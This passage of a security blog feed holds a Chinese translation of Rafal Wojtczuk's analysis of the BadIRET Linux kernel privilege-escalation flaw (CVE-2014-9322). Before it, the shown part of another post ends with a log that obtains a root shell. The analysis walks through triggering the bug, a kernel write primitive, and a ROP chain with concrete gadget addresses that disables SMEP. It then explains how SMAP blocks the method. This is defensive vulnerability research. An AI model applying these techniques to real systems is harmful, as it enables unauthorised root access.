AAAAAAAAAAAAAAAAAAA[1]+  Done                    ./procrop 1
Segmentation fault (core dumped)
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$
&lt;/pre&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;p&gt;1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&lt;/p&gt;

&lt;p&gt;2) https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;3) https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;p&gt;4) http://blog.pi3.com.pl/?p=509&lt;/p&gt;

&lt;p&gt;5) http://twitter.com/grsecurity/status/562363332079144960&lt;/p&gt;

&lt;p&gt;6) http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&lt;/p&gt;

&lt;p&gt;8) http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;p&gt;9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;p&gt;UPDATE:基于PCID的UDEREF实现最早是在2013年8月，而不是2014年2月。&lt;/p&gt;

&lt;p&gt;Best regards,&lt;/p&gt;

&lt;p&gt;Adam ‘pi3’ Zabrocki&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Jul 2015 06:00:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/07/06/badiret-exp.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/07/06/badiret-exp.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>漏洞利用&quot;BadIRET&quot;分析(CVE-2014-9322, Linux内核提权)</title>
        <description>&lt;p&gt;作者：Rafal Wojtczuk，Feb 2 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;Exploiting “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, Feb 5 2015&lt;/p&gt;

&lt;p&gt;POC( 感谢Mickey提供的链接):
https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;Solidot相关报道：
http://www.solidot.org/story?sid=42951&lt;/p&gt;

&lt;p&gt;Shawn：Linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都
没有正确的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触
发一个 IRET指令从错误的地址空间去访问GS基地址来提权。这个编号为
CVE-2014-9322,漏洞于2014年11月23日被Linux内核社区修复，之后的几个礼拜里
没有出现公开的利用代码甚至相关的讨论。当人们快要遗忘这个威胁的时候，
Rafal Wojtczuk的分析文章Exploiting “BadIRET” vulnerability似乎在提醒我
们：别忘了斯拉夫兵工厂。Rafal在Fedora 20 64-bit GNU/Linux发行版上完成了
研究和测试工作，内核是3.11.10-301。也提醒那些平时不重视安全运维的企业和
个人，修复已知漏洞是必须的工作，因为你永远不知道你的敌人在哪里买卖什么
样的数字军火。对于这个漏洞，本文的结论是SMEP虽然被绕过了，但SMAP是依然
奏效的，这里只想提一下类似PaX/Grsecurity的UDEREF特性和SMAP类似，只是属
于纯软件实现，大概2006/2007年左右这个特性就已经有了而且被一些anarchy广
泛使用。这次Rafal也谈到说这个如此严重的漏洞居然数月都没有公开讨论，但其
实在12月中旬俄罗斯的某技术社区就已经进行了详细讨论并最终给出了PoC，这是
一次针对非英文世界的公开威胁情报分析的重大失误的典型案例。随着Intel在
CPU里实现了类似UDEREF的SMEP和SMAP等特性，主流GNU/Linux发行版的内核也在
逐渐支持此类特性，防御在升级的同时，欧罗巴的数字军火也在不断升级，2014
年已经有多个团队实现了不touch用户空间的SYSRET漏洞利用。&lt;/p&gt;

&lt;p&gt;这个漏洞影响很广，&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2014-9322&quot;&gt;Debian&lt;/a&gt;几乎所有社区还在维护的版本都受影响。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2014-9322&quot;&gt;RedHat的企业版&lt;/a&gt;RHEL 4/5/6/7都受影响。&lt;/p&gt;

&lt;h2 id=&quot;intro&quot;&gt;0. Intro&lt;/h2&gt;

&lt;p&gt;CVE-2014-9322的描述如下：&lt;/p&gt;
&lt;pre&gt;
linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都没有正确
的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触发一个
IRET指令从错误的地址空间去访问GS基地址来提权。
&lt;/pre&gt;

&lt;p&gt;这个漏洞于2014年11月23日被社区修复[2]，至今我并没有见到公开的利用代码和
详细的讨论。这篇文章我会尝试去解释这个漏洞的本质以及利用的过程。不幸的
是，我无法完全引用Intel白皮书[3]的所有内容，如果有读者不熟悉一些术语可
以直接查Intel白皮书。所有的实验都是在Fedora 20 64-bit发行版上完成的，内
核是3.11.10-301，所有的讨论基于64位进行。&lt;/p&gt;

&lt;p&gt;简单结论概要：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;通过测试，这个漏洞可以完全稳定的被利用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SMEP[4]不能阻止任意代码执行；SMAP[5]可以阻止任意代码执行。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Digression: kernel, usermode, iret
&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/badiret-cartoon.jpg?w=893&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;2. 漏洞&lt;/h2&gt;

&lt;p&gt;在一些情况下，linux内核通过iret指令返回用户空间时会产生一个异常。异常处
理程序把执行路径返回到了bad_iret函数，她做了：&lt;/p&gt;

&lt;pre&gt;
     /* So pretend we completed the iret and took the #GPF in user mode.*/
     pushq $0
     SWAPGS
     jmp general_protection
&lt;/pre&gt;

&lt;p&gt;正如这行评论所解释，接下来的代码流应该和一般保护异常(General
Protection)在用户空间发生时（转跳到#GP处理程序）完全相同。这种异常处理
情况大多是由iret指令引发的，e.g. #GP。&lt;/p&gt;

&lt;p&gt;问题在于#SS异常。如果有漏洞的内核（比如3.17.5）也有”espfix”功能（从
3.16引入的特性），之后bad_iret函数会在只读的栈上执行”push”指令，这会导
致页错误（page fault）而会直接引起两个错误。我不考虑这种场景；从现在开
始，我们只关注在3.16以前的没有”espfix”的内核。&lt;/p&gt;

&lt;p&gt;这个漏洞根源于#SS的异常处理程序没有符合
“pretend-it-was-#GP-in-userspace”[6]的规划，与#GP处理程序相比，#SS异常
处理会多做一次swapgs指令。如果你对swapgs不了解，请不要跳过下面的章节。&lt;/p&gt;

&lt;h2 id=&quot;swapgs&quot;&gt;3. 偏题：swapgs指令&lt;/h2&gt;

&lt;p&gt;当内存通过gs段进行访问时，像这样：&lt;/p&gt;

&lt;pre&gt;
mov %gs:LOGICAL_ADDRESS, %eax
&lt;/pre&gt;

&lt;p&gt;实际会发生以下几步：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;BASE_ADDRESS值从段寄存器的隐藏部分取出&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;内存中的线性地址LOGICAL_ADDRESS+BASE_ADDRESS被dereferenced（Shawn:
char *p; *p就是deref）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;基地址是从GDT（或者LDT）继承过来的。无论如何，有一些情况是GS段基地址被
修改的动作不需要GDT的参与。&lt;/p&gt;

&lt;p&gt;引用自Intel白皮书：&lt;/p&gt;

&lt;p&gt;“SWAPGS把当前GS基寄存器值和在MSR地址C0000102H(IA32_KERNEL_GS_BASE)所包
含的值进行交换。SWAPGS指令是一个为系统软件设计的特权指令。(….)内核可
以使用GS前缀在正常的内存引用去访问[per-cpu]内核数据结构。”&lt;/p&gt;

&lt;p&gt;Linux内核为每个CPU在启动时分配一个固定大小的结构体来存放关键数据。之后
为每个CPU加载IA32_KERNEL_GS_BASE到相应的结构地址上，因此，通常的情况，
比如系统调用的处理程序是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;swapgs（现在是GS指向内核空间）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;通过内存指令和gs前缀访问per-cpu内核数据结构&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;swapgs（撤销之前的swapgs，GS指向用户空间）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;返回用户空间&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;内核代码天生必须保证随时能访问到带gs前缀的percpu数据，内核执行一堆
swapgs指令时条目来自用户空间并不是偶然。(所以gs base指向内核内存）&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;4. 触发漏洞&lt;/h2&gt;

&lt;p&gt;现在很明显可以看到这个漏洞简直就是坟墓，因为多了一个swapgs指令在有漏洞
代码路径里，内核会尝试从可能被用户操控的错误GS基地址访问重要的数据结构。&lt;/p&gt;

&lt;p&gt;当iret指令产生了一个#SS异常？有趣的是，Intel白皮书在这方面介绍不完全(
Shawn:是阴谋论的话又会想到BIG BROTHER?)；描述iret指令时，Intel白皮书这
么讲：&lt;/p&gt;

&lt;pre&gt;
64位模式的异常：

#SS(0)

如果一个尝试从栈上pop一个值违反了SS限制。

如果一个尝试从栈上pop一个值引起了non-canonical地址（Shawn: 64-bit下只允
许访问canonical地址）的引用。
&lt;/pre&gt;

&lt;p&gt;没有一个条件能被强制在内核空间里发生。无论如何，Intel白皮书里的iret伪代
码展示了另外一种情况：when the segment defined by the return frame is
not present:&lt;/p&gt;

&lt;pre&gt;
IF stack segment is not present

THEN #SS(SS selector); FI;
&lt;/pre&gt;

&lt;p&gt;所以在用户空间，我们需要设置ss寄存器为某个值来表示不存在。这不是很直接：
我们不能仅仅使用：&lt;/p&gt;

&lt;pre&gt;
mov $nonpresent_segment_selector, %eax

mov %ax, %ss
&lt;/pre&gt;

&lt;p&gt;第二条指令会引发#GP。通过调试器（任何ptrace)设置ss寄存器是不允许的；类
似的，sys_sigreturn系统调用不会在64位系统上设置这个寄存器（可能32位能工
作）。解决方案是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;线程A：通过sys_modify_ldt系统调用在LDT里创建一个定制段X&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程B：s:=X_selector&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程A：通过sys_modify_ldt使X无效&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程B：等待硬件中断&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;为什么需要在一个进程里使用两个线程的原因是从系统调用（包括
sys_modify_ldt）返回是通过硬编码了#ss值的sysret指令。如果我们使X在相同
的线程中无效就等同于”ss:=X 指令“，ss寄存器会处于未完成设置的状态。运行
以上代码会导致内核panic。按照更有意义的做法，我们将需要控制用户空间的
gs基地址；她可以通过系统调用arch_prctl(ARCH_SET_GS)被设置。&lt;/p&gt;

&lt;h2 id=&quot;achieving-write-primitive&quot;&gt;5. Achieving write primitive&lt;/h2&gt;

&lt;p&gt;如果运行以上代码，#SS处理程序会正常的返回bad_iret（意思是没有触及到内存
的GS基地址），之后转跳到#GP异常处理程序，执行一段时间后就调用到了这个函
数：&lt;/p&gt;

&lt;pre&gt;
289 dotraplinkage void
290 do_general_protection(struct pt_regs *regs, long error_code)
291 {
292         struct task_struct *tsk;
...
306         tsk = current;
307         if (!user_mode(regs)) {
                ... it is not reached
317         }
318 
319         tsk-&amp;gt;thread.error_code = error_code;
320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
321 
322         if (show_unhandled_signals &amp;amp;&amp;amp; unhandled_signal(tsk, SIGSEGV) &amp;amp;&amp;amp;
323                         printk_ratelimit()) {
324                 pr_info(&quot;%s[%d] general protection ip:%lx sp:%lx
error:%lx&quot;,
325                         tsk-&amp;gt;comm, task_pid_nr(tsk),
326                         regs-&amp;gt;ip, regs-&amp;gt;sp, error_code);
327                 print_vma_addr(&quot; in &quot;, regs-&amp;gt;ip);
328                 pr_cont(&quot;\n&quot;);
329         }
330 
331         force_sig_info(SIGSEGV, SEND_SIG_PRIV, tsk);
332 exit:
333         exception_exit(prev_state);
334 }
&lt;/pre&gt;

&lt;p&gt;C代码不太明显，但从gs前缀读取到现有宏的值赋给了tsk。第306行是：&lt;/p&gt;

&lt;pre&gt;
0xffffffff8164b79d :	mov    %gs:0xc780,%rbx
&lt;/pre&gt;

&lt;p&gt;这很变得有意思起来了。我们控制了current指针，她指向用于描述整个Linux进
程的数据结构。&lt;/p&gt;
&lt;pre&gt;

319         tsk-&amp;gt;thread.error_code = error_code;
320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
&lt;/pre&gt;

&lt;p&gt;写入（从task_struct开始的固定偏移）我们控制的地址。注意值本身不能被控制
（分别是0和0xd常量），但这不应该成为一个问题。游戏结束？&lt;/p&gt;

&lt;p&gt;不会，我们想覆盖一些在X上的重要数据结构。如果我们按照以下的步骤：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;准备在FAKE_PERCPU的用户空间内存，设置gs基地址给她&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让地址FAKE_PERCPU+0xc780存着指针FAKE_CURRENT_WITH_OFFSET，以满足
FAKE_CURRENT_WITH_OFFSET= X – offsetof(struct task_struct,
thread.error_code)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;触发漏洞&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;之后do_general_protection会写入X。但很快就会尝试再次访问current
task_current的其他成员，e.g.unhandled_signal()函数从task_struct指针解引
用。我们没有依赖X来控制，最终会在内核产生一个页错误。我们怎么避免这个问
题？选项有：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;什么都不做。Linux内核不像Windows，Linux内核是完全允许当一个不是预期
的页错误在内核出现，如果可能的话，内核会杀死当前进程之后尝试继续运行
（Windows会蓝屏）。这种机制对于大量内核数据污染就无能为力了。我的猜测是
在当前进程被杀死后，swapgs不平衡的保持下来，这会导致其他进程上下文的更
多页错误。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用“tsk-&amp;gt;thread.error_code = error_code”覆盖为页错误处理程序的IDT入
口。之后页错误发生（被unhandled_signal()触发）。这个技术曾经在一些偶然
的环境中成功过。但在这里不会成功，因为有2个原因：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;Linux让IDT只读&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;就算IDT可写，我们也不能控制覆盖的值 – 0或者0xd。SMEP/SMAP也
    会是问题。&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;我们可以尝试产生一个竞争。“tsk-&amp;gt;thread.error_code = error_code”会促
进代码执行，比如允许通过系统调用控制的代码指针P。之后我们可以在CPU 0上
触发漏洞，在同一时间段CPU 1可以循环执行一些系统调用。这个思路可以在CPU
0被破坏前让通过CPU 1获得代码执行，比如hook页错误处理程序，这样CPU 0不会
影响更多的地方，我尝试了这种方法多次，但都失败了。可能不同的漏洞在时间
线上的不同所致。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Throw a towel on “tsk-&amp;gt;thread.error_code = error_code” write.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;虽然有些恶心，我们会尝试最后一个选项。我们会让current指向用户空间，设置
这个指针可以通过读的deref到我们能控制的内存。自然的，我们观察接下来的代
码，找找更多的写deref。&lt;/p&gt;

&lt;h2 id=&quot;achieving-write-primitive-continued-aka-life-after-dogeneralprotection&quot;&gt;6. Achieving write primitive continued, aka life after do_general_protection&lt;/h2&gt;

&lt;p&gt;下一个机会是do_general_protection()所调用的函数：&lt;/p&gt;

&lt;pre&gt;
int
force_sig_info(int sig, struct siginfo *info, struct task_struct *t)
{
        unsigned long int flags;
        int ret, blocked, ignored;
        struct k_sigaction *action;

        spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
        action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
        ignored = action-&amp;gt;sa.sa_handler == SIG_IGN;
        blocked = sigismember(&amp;amp;t-&amp;gt;blocked, sig);   
        if (blocked || ignored) {
                action-&amp;gt;sa.sa_handler = SIG_DFL;
                if (blocked) {
                        sigdelset(&amp;amp;t-&amp;gt;blocked, sig);
                        recalc_sigpending_and_wake(t);
                }
        }
        if (action-&amp;gt;sa.sa_handler == SIG_DFL)
                t-&amp;gt;signal-&amp;gt;flags &amp;amp;= ~SIGNAL_UNKILLABLE;
        ret = specific_send_sig_info(sig, info, t);
        spin_unlock_irqrestore(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);

        return ret;
}
&lt;/pre&gt;

&lt;p&gt;task_struct的成员sighand是一个指针，我们可以设置任意值。&lt;/p&gt;

&lt;pre&gt;

action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
action-&amp;gt;sa.sa_handler = SIG_DFL;

&lt;/pre&gt;

&lt;p&gt;我们无法控制写的值，SIG_DFL是常量的0。这里最终能工作了，虽然有些扭曲。
假设我们想覆盖内核地址X。为此我们准备伪造的task_struct，所以X等于
t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的地址。上面还有一行要注意：&lt;/p&gt;

&lt;pre&gt;
spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
&lt;/pre&gt;

&lt;p&gt;t-&amp;gt;sighand-&amp;gt;siglock在t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的常量偏移
上，内核会调用spin_local_irqsave在某些地址上，X+SPINLOCK的内容无法控制。
这会发生什么呢？两种可能性：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;X+SPINLOCK所在的内存地址看起来像没有锁的spinlock。spin_lock_irqsave
会立即完成。最后，spin_unlock_irqrestore会撤销spin_lock_irqsave的写操作。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;2.X+SPINLOCK所在的内存地址看起来像上锁的spinlock。如果我们不介入的话，
spin_lock_irqsave会无线循环等待spinlock。有些担心，要绕过这个障碍我们得
需要其他假设 — X+SPINLOCK所在内存地址的内容。这是可接受的，我们可以在
后面看到在内核.data区域里设置X。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* 首先，准备FAKE_CURRENT，让t-&amp;gt;sighand-&amp;gt;siglock指向用户空间上锁
      的区域，SPINLOCK_USERMODE

* force_sig_info()会挂在spin_lock_irqsave里

* 这时，另外一个用户空间的线程在另外一个CPU上运行，并且改变了
      t-&amp;gt;sighand，所以t-&amp;gt;sighand-&amp;gt;action[sig-1.sa.sa_hander成了我们
      的覆盖目标，之后解锁SPINLOCK_USERMODE

* spin_lock_irqsave会返回

* force_sig_info()会重新载入t-&amp;gt;sighand，执行期望的写操作
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;鼓励细心的读者追问为什么不能使用第2种方案，即X+SPINLOCK在初始时是没有锁
的。这并不是全部 — 我们需要准备一些FAKE_CURRENT的字段来让尽量少的代码
执行。我不会再透露更多细节 — 这篇BLOG已经够长了….下一步会发生什么？
force_sig_info()和do_general_protection()返回。接下来iret指令会再次产生
#SS异常处理（因为仍然是用户空间ss的值在栈上引用了一个nonpresent段），但
这一次，#SS处理程序里的额外swapgs指令会返回并取消之前不正确的swapgs。
do_general_protection()会调用和操作真正的task_struct，而不是伪造的
FAKE_CURRENT。最终，current会发出SIGSEGV信号，其他进程会被调度来执行。
这个系统仍然是稳定的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/diagram1.png?w=595&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;smep&quot;&gt;7. 插曲：SMEP&lt;/h2&gt;

&lt;p&gt;SMEP是Intel处理器从第3代Core（Shawn：酷睿）时加入的硬件特性。如果控制寄
存器CR4里的SMEP位被设置的话，当RING0（Shawn：标准Linux内核是RING0，在
XEN下是例外，RING0是Hypervisor）尝试执行的代码来自标记为用户空间的内存
页，CPU就会生成一个错误（Shawn：就是拒绝）。如果可能的话，Linux内核会默
认开启SMEP。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;8. 实现代码执行&lt;/h2&gt;

&lt;p&gt;之前的章节讲述了一种如何以0在内核内存中覆盖8个连续字节的方法。如果SMEP
开启的情况下如何实现代码执行呢？&lt;/p&gt;

&lt;p&gt;直接覆盖一个内核代码的指针是不行的。我们可以清零top bytes( Shawn: MSB)
- 但之后的地址会在用户空间，所以SMEP会阻止这个指针的deref。&lt;/p&gt;

&lt;p&gt;换一种方式，我们可以清零几个low bytes( Shawn: LSB)，但是之后能利用这个
指针的概率也很低。&lt;/p&gt;

&lt;p&gt;我们需要一个内核指针P指向结构X包含了代码指针。我们可以覆盖P的top bytes
让她成为一个用户空间的地址，这样P-&amp;gt;code_pointer_in_x()调用会跳转到一个
我们能选择的地址。我不确定最好选择哪个攻击对象。从我的经验来看，我选择
内核proc_root变量，这是一个结构体：&lt;/p&gt;

&lt;pre&gt;
struct proc_dir_entry {
            ...
        const struct inode_operations *proc_iops;
        const struct file_operations *proc_fops;
        struct proc_dir_entry *next, *parent, *subdir;
        ...
        u8 namelen;
        char name[];
};
&lt;/pre&gt;

&lt;p&gt;这个结构体是一个proc文件系统的入口（proc_root是/proc作为proc文件系统的
根目录）。当一个文件名路径开始在/proc里查询时，subdir指针（从
proc_root.subdir开始）会跟进，直到名字被找到。之后proc_iops的指针会被调
用：&lt;/p&gt;

&lt;pre&gt;
struct inode_operations {
        struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int);
        void * (*follow_link) (struct dentry *, struct nameidata *);
        ...many more...
        int (*update_time)(struct inode *, struct timespec *, int);
        ...
} ____cacheline_aligned;
&lt;/pre&gt;

&lt;p&gt;proc_root驻扎在内核代码段里，这意味着漏洞利用需要知道她的地址。这个信息
可以从/proc/kallsyms符号表得到；当然，很多加固过的内核不允许普通用户读
取这个文件。但如果内核是一个已知的build（标准的GNU/Linux发行版），这个
地址可以轻松获得；和一堆偏移一样需要构建FAKE_CURRENT。&lt;/p&gt;

&lt;p&gt;我们会覆盖proc_root.subdir，让她成为一个指向一个在用户空间能被控制的结
构体proc_dir_entry。有点困难在于我们不能覆盖整个指针。别忘了我们的写操
作是“覆盖8个0”。如果我们让proc_root.subdir变成0，我们不会去映射她，因为
Linux内核不允许用户空间映射到地址0上（更确切的说发是，任何低于
/proc/sys/vm/mmap_min_addr的地址，默认值一般是4k）。（Shawn：想想哪些
0ld good hacking days，每天都有一堆NULL pointer deref是多么幸福活着无挑
战的时光啊;-))。这意味着我们需要：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;映射16MB的内存到地址4096&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用类似proc_dir_entry的方式来填充，把inode_operations字段指向用户空
间的地址FAKE_IOPS，name字段为字符串”A”。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置漏洞利用去覆盖proc_root.subdir的top 5 bytes。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;之后，除非proc_root.subdir最低的3 bytes是0，我们可以确定在触发
force_sig_info()覆盖后，proc_root.subdir会指向被控制的用户空间内存。当
我们的进程调用open(“/proc/A”,…)时，FAKE_IOPS的指针会被调用。她们应该
指向哪里呢？如果你认为答案是“指向我们的shellcode“，请再读一遍上面的分析。&lt;/p&gt;

&lt;p&gt;我们需要让FAKE_IOPS指针指向一个stack pivot[1]序列。这再次假设了具体内核
运行的版本情况。通常的”xchg %esp, %eax; ret”代码序列（2个字节，94 c3是
在测试内核的地址0xffffffff8119f1ed）很好的可以用于64位内核的ROP。就算没
能控制%rax，这个xchg指令操作32位的寄存器也能清掉%rsp的高32位而让%rsp着
陆在用户空间的内存里。在最糟糕的情况下，我们可以分配低4GB的虚拟内存然后
填充ROP链条。&lt;/p&gt;

&lt;p&gt;在当前测试的内核（Fedora 20)有两种方法去deref在FAKE_IOPS的指针：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;%rax:=FAKE_IOPS; call *SOME_OFFSET(%rax)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;%rax:=FAKE_IOPS; %rax:=SOME_OFFSET(%rax); call *%rax&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;第1种情况里，在%rsp和%rax交换值后，她会等于FAKE_IOPS。我们需要ROP链条驻
扎在FAKE_IOPS的起始位置，这需要类似“add $A_LOT, %rsp; ret”的指令，然后
在继续。&lt;/p&gt;

&lt;p&gt;第2种情况里，%rsp会分配低32位的调用目标，即0x8119f1ed。我们需要准备在这
个地址上的ROP链条。&lt;/p&gt;

&lt;p&gt;计算一下%rax值有两者之一的已知值在特定的时间指向stack pivot序列，我们不
需要ROP链条填充整个4GB内存，只需要上面的两个地址即可。第2种情况的ROP链
条自身很简洁：&lt;/p&gt;

&lt;pre&gt;
unsigned long *stack=0x8119f1ed;
*stack++=0xffffffff81307bcdULL;  // pop rdi, ret
*stack++=0x407e0;                //cr4 with smep bit cleared
*stack++=0xffffffff8104c394ULL;  // mov rdi, cr4; pop %rbp; ret
*stack++=0xaabbccdd;             // placeholder for rbp
*stack++=actual_shellcode_in_usermode_pages;
&lt;/pre&gt;

&lt;h2 id=&quot;smap&quot;&gt;9. 插曲：SMAP&lt;/h2&gt;

&lt;p&gt;SMAP是Intel从第5代Core处理器推出的一个硬件特性。如果CR4控制寄存器的
SMAP位被设置的话，CPU会拒绝用户空间的页被RING0访问（Shawn：个人理解，
SMAP和SMEP最大的不同主要是SMEP针对代码段，而SMAP针对数据段）。Linux内核
通常会默认开启SMAP。一个测试的内核模块（Core-M 5Y10a CPU）尝试访问用户
空间然后crash了：&lt;/p&gt;

&lt;pre&gt;
[  314.099024] running with cr4=0x3407e0
[  389.885318] BUG: unable to handle kernel paging request at 00007f9d87670000
[  389.885455] IP: [ffffffffa0832029] test_write_proc+0x29/0x50 [smaptest]
[  389.885577] PGD 427cf067 PUD 42b22067 PMD 41ef3067 PTE 80000000408f9867
[  389.887253] Code: 48 8b 33 48 c7 c7 3f 30 83 a0 31 c0 e8 21 c1 f0 e0 44 89 e0 48 8b 
&lt;/pre&gt;

&lt;p&gt;正如我们看到的，用户空间的页是正常的，但访问也报了页错误。Windows系统不
太支持SMAP；Windows 10技术预览版build 9926的cr4=0x1506f8（SMEP启动，
SMAP关闭）；对比Linux内核(同样的测试硬件）你可以看到cr4的bit 21是没有设
置的。这不奇怪，在Linux中，访问用户空间是通过调用copy_from_user(),
copy_to_user()和类似函数显式执行的，所以执行这些操作时临时关闭SMAP是可
行的。在Windows上，内核代码直接访问用户空间代码，只是包装了一层访问异常
处理程序，所以要让SMAP工作正常需要调整所有的驱动，这是一项困难的工作。&lt;/p&gt;

&lt;h2 id=&quot;smap-to-the-rescue&quot;&gt;10. SMAP to the rescue!&lt;/h2&gt;

&lt;p&gt;上面的漏洞利用方法依赖于在用户空间里准备特定的数据结构，然后强制内核认
为她们是可信的内核数据。这种方法对于开启SMAP特性的内核不奏效 — CPU会
拒绝从用户空间读取恶意数据。我们能做的是构造所有需要用的数据结构，然后
拷贝她们到内核。比如：&lt;/p&gt;

&lt;pre&gt;
write(pipe_filedescriptor, evil_data, ...
&lt;/pre&gt;

&lt;p&gt;之后evil_data会被拷贝到一个内核管道缓冲区里。我们可能需要猜测她的地址；
some sort of heap spraying, combined with the fact that there is no
spoon^W effective kernel ASLR[9], could work, although it is likely to be
less reliable than exploitation without SMAP.&lt;/p&gt;

&lt;p&gt;总之，还有最后一个障碍 — 不要忘了我们需要设置用户空间的gs base去指向
我们的漏洞利用的数据结构。在上面的场景（没有SMAP），我们使用
arch_prctl(ARCH_SET_GS)系统调用，她是这样在内核里实现的：&lt;/p&gt;

&lt;pre&gt;
long do_arch_prctl(struct task_struct *task, int code, unsigned long addr)
{ 
         int ret = 0; 
         int doit = task == current;
         int cpu;
 
         switch (code) { 
         case ARCH_SET_GS:
                 if (addr &amp;gt;= TASK_SIZE_OF(task))
                         return -EPERM; 
                 ... honour the request otherwise
&lt;/pre&gt;

&lt;p&gt;休斯顿，我们有一个麻烦 — 我们不能使用这个API去设置gs base用户空间以上
的内存！&lt;/p&gt;

